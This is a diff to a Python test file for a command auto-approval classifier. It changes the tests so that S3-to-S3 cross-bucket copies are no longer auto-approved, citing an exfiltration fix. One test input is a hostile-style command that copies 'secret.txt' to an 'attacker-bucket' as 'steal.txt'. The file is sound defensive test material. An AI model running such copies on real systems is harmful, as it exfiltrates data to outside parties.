@@ -680,10 +680,10 @@ class TestCommandClassification:
         assert app_module.is_auto_approve('aws sts get-caller-identity')
         assert app_module.is_auto_approve('aws rds describe-db-instances')
         assert app_module.is_auto_approve('aws logs filter-log-events --log-group xxx')
-        # S3 download
+        # S3 download（S3→local）— 允許自動批准
         assert app_module.is_auto_approve('aws s3 cp s3://my-bucket/file.txt /tmp/file.txt')
-        # S3→S3 copy (staging → frontend bucket)
-        assert app_module.is_auto_approve(
+        # S3→S3 copy（cross-bucket exfiltration 風險，P1-4 修復）— 不允許自動批准
+        assert not app_module.is_auto_approve(
             'aws s3 cp s3://bouncer-uploads-190825685292/2026-02-24/abc/index.js '
             's3://ztp-files-dev-frontendbucket-nvvimv31xp3v/assets/index.js '
             '--content-type application/javascript --cache-control max-age=31536000,immutable '
@@ -701,6 +701,28 @@ class TestCommandClassification:
         # Other CF distributions still require approval
         assert not app_module.is_auto_approve(
             'aws cloudfront create-invalidation --distribution-id EXXXXXXXXXX --paths "/*"'
+        )
+
+    def test_s3_cp_cross_bucket_exfil_blocked(self, app_module):
+        """P1-4 regression: s3 cp S3→S3 cross-bucket copy 不應自動批准"""
+        # S3→local download — OK
+        assert app_module.is_auto_approve(
+            'aws s3 cp s3://bucket/file.txt ./local'
+        )
+        assert app_module.is_auto_approve(
+            'aws s3 cp s3://my-bucket/data.json /tmp/data.json'
+        )
+        # S3→S3 copy — NOT OK（cross-bucket exfiltration 風險）
+        assert not app_module.is_auto_approve(
+            'aws s3 cp s3://src-bucket/file.txt s3://dst-bucket/file.txt'
+        )
+        # S3→S3 recursive — NOT OK
+        assert not app_module.is_auto_approve(
+            'aws s3 cp s3://src/dir/ s3://dst/dir/ --recursive'
+        )
+        # S3→S3 with extra flags — NOT OK
+        assert not app_module.is_auto_approve(
+            'aws s3 cp s3://any-bucket/secret.txt s3://attacker-bucket/steal.txt --region us-east-1'
         )
     
     def test_approval_required(self, app_module):
